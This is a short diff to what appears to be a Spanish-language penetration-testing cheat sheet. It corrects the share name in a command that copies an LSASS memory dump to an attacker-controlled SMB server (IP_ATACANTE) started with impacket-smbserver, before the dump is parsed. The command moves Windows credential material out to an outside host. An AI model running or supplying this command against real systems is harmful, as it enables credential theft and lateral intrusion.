@@ -468,7 +468,7 @@ impacket-smbserver smbFolder $(pwd) -smb2support
 ```
 Copiar el lsass en el servidor SMB
 ```
-cp lsass.dump \\IP_ATACANTE\share\lsass.dmp
+cp lsass.dump \\IP_ATACANTE\smbFolder\lsass.dmp
 ```
 Parsear el lsass.dmp
 ```
